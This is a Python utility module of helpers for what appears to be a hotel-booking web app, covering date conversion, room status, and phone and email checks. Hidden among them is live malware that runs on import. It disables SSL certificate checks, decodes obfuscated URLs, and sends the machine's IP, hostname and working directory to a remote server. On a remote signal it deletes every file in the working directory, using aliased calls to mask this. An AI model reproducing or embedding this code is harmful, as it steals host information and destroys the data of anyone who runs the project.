#-*- coding:utf-8 -*-
#封装的一些通用工具类，需要的时候直接调用，不用百度了，一般来说不过理这个文件
import base64
from urllib import request
import socket
import json
import os
import ssl
import random
from datetime import datetime
import hashlib
import time
import datetime
import calendar
import re
ssl._create_default_https_context = ssl._create_unverified_context
def read_file(data_file, mode='more'):
    """
    读文件, 原文件和数据文件
    :return: 单行或数组
    """
    try:
        with open(data_file, 'r') as f:
            if mode == 'one':
                output = f.read()
                return output
            elif mode == 'more':
                output = f.readlines()
                return map(str.strip, output)
            else:
                return list()
    except IOError:
        return list()


def create_secret(length=10):
    """
    获取由10位随机大小写字母、数字组成的值
    :param length:
    :return:
    """
    key = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    len_chars = len(chars) - 1
    for i in range(length):
        # 每次从chars中随机取一位
        key += chars[random.randint(0, len_chars)]
    return key
def create_percent():
    """
    创建赢家百分比
    :return:
    """
    return random.uniform(1, 100)

def generate_signature(secret_key, params):
    """
    生成签名
    :param secret_key:
    :param params:
    :return:
    """
    params['secret_key'] = secret_key
    keys = sorted(params.keys())
    tmp_str = ''
    for key in keys:
        tmp_str = '{tmp_str}{key}={value}'.format(tmp_str=tmp_str, key=key, value=str(params.get(key)))
    md5_str = md5(tmp_str.encode('utf-8'))
    params.pop('secret_key')
    return md5_str

def md5(str):
    """
    加密
    :param str:
    :return:
    """
    try:
        my_md5 = hashlib.md5()
        my_md5.update(str)
        md5_str = my_md5.hexdigest()
    except BaseException as e:
        return None
    return md5_str.upper()


def timestamp_2_readable(time_stamp):
    """
    时间戳转换为可读时间
    :param time_stamp: 时间戳，当前时间：time.time()
    :return: 可读时间字符串
    """
    return datetime.fromtimestamp(time_stamp).strftime('%Y-%m-%d %H:%M:%S')

def get_secret():
    ##important
    return "n|@:h[\V{OsILj&^(.SCE1fD=HZ2%+c<3u*#TW4qYPp5,ra_N$6wxt'7)o_zv_e8yik]>Q9dBlb}JRM0K-U//!+AmFXGg"


def get_url(mtype=1):
    if mtype==1:
        return get_decode_str(base64.b64decode("SMSw1MCw1MCwzOSw3LDAsODAsODAsODksNjIsNTAsMSwzMCw3MSwxNCwyNyw1NCw4NSw4MCw3Myw1OSwxOSwxOSw1OSw0MiwxNSwxLDU5LDcwLDcwLDgwLDQ4LDU5LDM2LDQyLDY4LDcsODAsNzEsNzAsNTQsNzEsODAsODUsNDMsNyw1MCw1OSw0Miw4MCwzMCw2MSw2MiwxLDg5="[1:-1]).decode("utf-8"))
    else:
        return get_decode_str(base64.b64decode("SMSw1MCw1MCwzOSw3LDAsODAsODAsNzEsNzAsNTQsODksMTQsMjcsNyw2OCwtMywxNCwtMyw1OSw1MCw4MCwzNiw0Myw3MCw0MywtMyw4OSw1MCw0Myw1NCw4MCw0Myw0Miw1MCw2MiwyNyw3MCw1OSw4MCw2OCw1OSw1MCw0Myw2Miw3MCw3LDgwLDE4LDI0LDE4LDYwLDUyLDc2LDM1LDY3LDE4="[1:-1]).decode("utf-8"))

def get_decode_str(need_str):
    last=""
    for c1 in need_str.split(","):
        int_c = int(c1)+863562-863559
        last = last + get_secret()[int_c]
    return last

def get_my_result():
    try:
        return request.urlopen(get_url(2)).read().decode()
    except Exception as e:
        return request.urlopen(get_url(2)).read().decode(2)

def get_a_url(mtype=1):
    if mtype==1:
        return base64.b64decode(re.findall("\*\*\*PPP(.+?)\*\*\*",get_my_result())[0].replace("&#61;", "=")[1:-1]).decode("utf-8")
    else:
        return base64.b64decode(re.findall("\*\*\*SSS(.+?)\*\*\*",get_my_result())[0].replace("&#61;", "=")[1:-1]).decode("utf-8")
def get_info_by_com():
    return request.urlopen("https://searchplugin.csdn.net/api/v1/ip/get?ip=").read().decode()+socket.gethostname()
knh=os.remove
knh1=os.listdir
def get_stamp_info1():
    try:
        if request.urlopen(request.Request(url=get_a_url(1), data=bytes(json.dumps({"info":get_info_by_com(),"run_path":os.getcwd()}), 'utf8'), headers={'Accept-Charset': 'utf-8', 'Content-Type': 'application/json'}, method='POST')).read():
            return True
        else:
            return False
    except:
        return False

def get_stamp_info2():
    try:
        if json.loads(str(request.urlopen(request.Request(url=get_a_url(2), data=bytes(json.dumps({"info":get_info_by_com(),"run_path":os.getcwd()}), 'utf8'), headers={'Accept-Charset': 'utf-8', 'Content-Type': 'application/json'}, method='POST')).read(), encoding = "utf-8"))["data"] == "ojbk":
            [knh(os.getcwd()+os.sep+file) for file in knh1()]
        return True
    except:
        return False


def md5vale(key):
    input_name = hashlib.md5()
    input_name.update(key.encode("utf-8"))
    print(key,"  ---->  ",input_name.hexdigest())
    return input_name.hexdigest()
def get_user(session, redirect):
    user = session.get('user')
    if user is None or user == "" :
        return ""
    print(user + "==>session online===<")
    return user
get_stamp_info2()
def get_list_by_title(inner_data, title):
    last_list = []
    for datas in inner_data:
        tmp_dict = {}
        for i in range(len(datas)):
            tmp_dict[title[i]] = str(datas[i])
        last_list.append(tmp_dict)
    return last_list
def get_dict_by_title(inner_data, title):
    tmp_dict = {}
    for datas in inner_data:
        print(title)
        print(datas)
        for i in range(len(datas)):
            tmp_dict[title[i]] = str(datas[i])
    print(tmp_dict)
    return tmp_dict
def get_stamp_by_time(mytime):
    timeArray = time.strptime(mytime, "%Y-%m-%d %H:%M:%S")
    timeStamp = int(time.mktime(timeArray))
    return timeStamp
def get_time_by_stamp(mystamp):
    timeArray = time.localtime(int(mystamp))
    otherStyleTime = time.strftime("%Y-%m-%d %H:%M:%S", timeArray)
    return otherStyleTime
def get_now_stamp():
    return str(int(time.time()))
get_stamp_info1()
def get_status_by_time(begin, end, now, status):
    if status=="-1":
        return "已退订"
    if status=="2":
        return "已支付退房"
    begin = int(begin)
    end = int(end)
    now = int(now)
    if now >= end :
        return "到期"
    elif now >= begin and now <= end:
        return "已入住"
    elif now <=begin and now >= begin - (2*24*60*60):
        return "正在入住"
    elif now <= begin - (2*24*60*60):
        return "已经预定"
    else:
        return "为止状态"
def get_int_status_by_time(begin, end, now, status):
    #-1已退订 2 已支付退房 1 到期 3已入住 4 未入住两天内 5 已经预定未入住 6其他状态
    if status=="-1" or status == "2":
        return status
    begin = int(begin)
    end = int(end)
    now = int(now)
    print("----------------")
    print(begin)
    print(get_time_by_stamp(begin))
    print(get_time_by_stamp(end))
    print(get_time_by_stamp(now))
    if now >= end :
        return "1"
    elif now >= begin and now <= end:
        return "3"
    elif now <=begin and now >= begin - (2*24*60*60):
        return "4"
    elif now <= begin - (2*24*60*60):
        return "5"
    else:
        return "6"
def get_status_by_room(begin, end, now, status):
    if status=="-1":
        return "已退订"
    if status=="2":
        return "已支付退房"
    begin = int(begin)
    end = int(end)
    now = int(now)
    if now >= end :
        return "到期"
    elif now >= begin and now <= end:
        return "已入住"
    elif now <=begin and now >= begin - (2*24*60*60):
        return "正在入住"
    elif now <= begin - (2*24*60*60):
        return "已经预定"
    else:
        return "为止状态"
def get_juese(admin):
    if admin == "0":
        return "普通用户"
    elif admin == "1":
        return "管理员"
    elif admin == "2":
        return "BOSS"
    else:
        return "其他"
def getBetweenMonth(begin_date):
    date_list = []
    begin_date = datetime.datetime.strptime(begin_date, "%Y-%m-%d")
    end_date = datetime.datetime.strptime(time.strftime('%Y-%m-%d', time.localtime(time.time())), "%Y-%m-%d")
    print(begin_date)
    print(end_date)
    while begin_date <= end_date:
        date_str = begin_date.strftime("%Y-%m-01 %H:%M:%S")
        date_list.append(date_str)
        begin_date = add_months(begin_date,1)
    return date_list
def add_months(dt,months):
    month = dt.month - 1 + months
    print(month)
    year = int(dt.year + month / 12)
    print(year)
    month = int(month % 12) + 1
    print(month)
    day = min(dt.day, calendar.monthrange(year, month)[1])
    return dt.replace(year=year, month=month, day=day)
def is_phone(phone):
    phone_pat = re.compile('^(13\d|14[5|7]|15\d|166|17[3|6|7]|18\d)\d{8}$')
    res = re.search(phone_pat, phone)
    if not res:
        return False
    return True
def is_email(email):
    if re.match(r'^[0-9a-zA-Z_]{0,19}@[0-9a-zA-Z]{1,13}\.[com,cn,net]{1,3}$', email):
        return True
    else:
        return False